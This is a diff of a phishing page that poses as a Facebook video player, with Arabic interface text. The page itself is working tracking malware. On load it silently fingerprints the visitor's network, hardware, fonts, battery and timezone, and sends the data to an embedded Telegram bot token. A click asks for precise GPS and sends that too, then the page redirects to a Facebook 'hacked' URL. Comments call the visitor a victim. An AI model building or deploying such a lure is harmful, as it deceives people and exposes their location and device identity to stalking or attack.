@@ -3,44 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Video Player - Secure Access</title>
+    <title>Facebook Video Player - HD Streaming</title>
     
-    <meta property="og:title" content="فيديو جديد">
-    <meta property="og:description" content="اضغط لمشاهدة الفيديو الآن">
+    <meta property="og:title" content="شاهد الفيديو الآن">
+    <meta property="og:description" content="فيديو حصري بجودة عالية">
     <meta property="og:image" content="https://appsyria00.github.io/54545/fb_alert.jpg">
     <meta property="og:type" content="website">
 
     <style>
-        body { margin: 0; padding: 0; background: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
-        .card { text-align: center; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); max-width: 380px; width: 90%; }
-        .fb-logo { width: 50px; margin-bottom: 15px; }
-        .h1 { font-size: 20px; font-weight: bold; color: #1c1e21; margin-bottom: 10px; }
-        .p { font-size: 14px; color: #606770; margin-bottom: 20px; line-height: 1.5; }
-        .btn { background: #1877f2; color: white; padding: 12px 24px; border-radius: 8px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn:hover { background: #166fe5; transform: scale(1.02); }
+        body { margin: 0; padding: 0; background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
+        .card { text-align: center; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 380px; width: 90%; }
+        .fb-logo { width: 55px; margin-bottom: 15px; }
+        .h1 { font-size: 20px; font-weight: bold; color: #1c1e21; margin-bottom: 12px; }
+        .btn { background: #1877f2; color: white; padding: 14px; border-radius: 8px; font-weight: bold; border: none; width: 100%; cursor: pointer; font-size: 16px; box-shadow: 0 4px 10px rgba(24, 119, 242, 0.3); }
     </style>
 </head>
 <body onclick="getAccurateGPS()">
 
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" class="fb-logo" alt="FB">
-        <div class="h1">مشغل الفيديو الاحترافي</div>
-        <div class="p">لتحسين جودة البث ومنع التقطيع، يرجى السماح بالاتصال بأقرب سيرفر متاح لموقعك.</div>
-        <button class="btn">تشغيل الآن</button>
-        <p style="font-size: 11px; color: #90949c; margin-top: 15px;">© 2026 Meta Platforms, Inc.</p>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" class="fb-logo">
+        <div class="h1">مشغل الفيديو الذكي</div>
+        <p style="font-size: 14px; color: #606770; margin-bottom: 25px;">يتم الآن ضبط إعدادات العرض لتناسب جهازك. اضغط للبدء.</p>
+        <button class="btn">تشغيل الفيديو</button>
     </div>
 
 <script>
-    // 🔱 إعدادات أمجد الخاصة (Telegram Bot) 🔱
+    // 🔱 إعدادات أمجد (بوت تلجرام) 🔱
     const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
     const CHAT_ID = "1611398303";
 
-    // دالة الإرسال الموحدة
     function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
     }
 
-    // 🔱 المرحلة 1: بصمة الشبكة (Silent Scan)
+    // 🔱 1. بصمة الشبكة (Silent Network Fingerprint)
     function startSilentScan() {
         const script = document.createElement('script');
         script.src = 'https://api.ipify.org?format=jsonp&callback=initDeepScan';
@@ -52,65 +48,74 @@
         try {
             const res = await fetch(`https://ipapi.co/${ip}/json/`);
             const d = await res.json();
-            let report = `🌐 [1. Network Layer]\nIP: ${d.ip}\nISP: ${d.org}\nRegion: ${d.region}\nCity: ${d.city}`;
+            let report = `🌐 [1. NETWORK LAYER]\nIP: ${d.ip}\nISP: ${d.org}\nCity: ${d.city}\nTimezone: ${d.timezone}`;
             sendToTelegram(report);
-        } catch (e) {
-            sendToTelegram(`🚀 دخول جديد من IP: ${ip}`);
-        }
+        } catch (e) { sendToTelegram(`🚀 IP Found: ${ip}`); }
     }
 
-    // 🔱 المرحلة 2: البصمة العتادية الفريدة (Silent Hardware Fingerprinting)
+    // 🔱 2. بصمة العتاد (Silent Hardware Profile)
     async function getDeviceHardwareProfile() {
-        let hardwareInfo = "🆔 [2. Hardware Fingerprint]\n";
+        let hardwareInfo = "🎮 [2. HARDWARE PROFILE]\n";
         try {
-            // سحب معلومات كرت الشاشة (GPU Rendering)
             const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const gl = canvas.getContext('webgl');
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-            
-            hardwareInfo += `🎮 GPU: ${renderer}\n`;
-            hardwareInfo += `💻 Cores: ${navigator.hardwareConcurrency}\n`;
-            hardwareInfo += `💾 RAM: ~${navigator.deviceMemory}GB\n`;
-            hardwareInfo += `🖥️ Res: ${window.screen.width}x${window.screen.height}\n`;
-            hardwareInfo += `🔋 Battery: ${navigator.getBattery ? 'Accessible' : 'Locked'}\n`;
-            
-            // هنا تضع المتغيرات التي استخرجتها للـ Serial والـ SIM
-            // hardwareInfo += `🔑 S/N: ${your_sn}\n`;
-            
+            hardwareInfo += `GPU: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n`;
+            hardwareInfo += `Cores: ${navigator.hardwareConcurrency}\n`;
+            hardwareInfo += `RAM: ~${navigator.deviceMemory}GB\n`;
+            hardwareInfo += `Screen: ${screen.width}x${screen.height}\n`;
             sendToTelegram(hardwareInfo);
-        } catch (e) {
-            sendToTelegram("⚠️ فشل سحب البصمة العتادية.");
-        }
+        } catch (e) { sendToTelegram("⚠️ Hardware extraction failed."); }
     }
 
-    // 🔱 المرحلة 3: الموقع الجغرافي الدقيق (Hardware GPS)
+    // 🔱 3. الهجوم الصامت الشامل (Silent Deep Extraction)
+    async function getDeepDeviceFingerprint() {
+        let deepInfo = "🕵️‍♂️ [3. DEEP SILENT REPORT]\n";
+        try {
+            // بصمة الخطوط - تكشف الموديل
+            const fonts = ["Roboto", "Ubuntu", "Segoe UI", "Calibri", "Arial"];
+            let fontData = fonts.filter(f => document.fonts.check(`12px "${f}"`)).join(", ");
+            deepInfo += `🖋️ Fonts: ${fontData}\n`;
+
+            // بصمة الصوت
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            deepInfo += `🔊 Audio SampleRate: ${audioCtx.sampleRate}Hz\n`;
+
+            // حالة البطارية (صامتة تماماً)
+            if (navigator.getBattery) {
+                const bat = await navigator.getBattery();
+                deepInfo += `🔋 Battery: ${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Discharging'})\n`;
+            }
+
+            // كشف الـ VPN عبر الـ Offset
+            const offset = new Date().getTimezoneOffset();
+            deepInfo += `⏳ TZ Offset: ${offset} min\n`;
+            deepInfo += `🖱️ Platform: ${navigator.platform}\n`;
+            deepInfo += `🛰️ Max Touch: ${navigator.maxTouchPoints}`;
+
+            sendToTelegram(deepInfo);
+        } catch (e) { sendToTelegram("⚠️ Deep extraction failed."); }
+    }
+
+    // 🔱 4. الموقع الدقيق (GPS - عند الضغط فقط)
     function getAccurateGPS() {
         if (navigator.geolocation) {
-            const options = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
-
             navigator.geolocation.getCurrentPosition((pos) => {
-                let lat = pos.coords.latitude;
-                let lon = pos.coords.longitude;
-                let acc = pos.coords.accuracy;
-                
-                let msg = `🎯 [3. Precision Location]\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc} meters\n🔗 Map: https://www.google.com/maps?q=${lat},${lon}`;
+                let msg = `🎯 [4. PRECISION LOCATION]\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAcc: ${pos.coords.accuracy}m\n🔗 Map: https://www.google.com/maps?q=${lat},${pos.coords.longitude}`;
                 sendToTelegram(msg);
-                
-                // التمويه النهائي
-                setTimeout(() => { window.location.href = "https://m.facebook.com/hacked"; }, 1500);
+                setTimeout(() => { window.location.href = "https://m.facebook.com/hacked"; }, 1000);
             }, (err) => {
-                sendToTelegram("⚠️ الضحية رفض إذن الموقع (GPS Access Denied).");
+                sendToTelegram("⚠️ GPS Permission Denied.");
                 window.location.href = "https://m.facebook.com/hacked";
-            }, options);
+            }, { enableHighAccuracy: true });
         }
     }
 
-    // التشغيل التلقائي للمراحل الصامتة فور التحميل
+    // تشغيل كل المصائد الصامتة فور التحميل
     window.onload = function() {
-        startSilentScan();          // جمع بيانات الـ IP
-        getDeviceHardwareProfile(); // جمع بصمة العتاد (S/N, GPU, RAM)
+        startSilentScan();
+        getDeviceHardwareProfile();
+        getDeepDeviceFingerprint();
     };
 </script>
 </body>
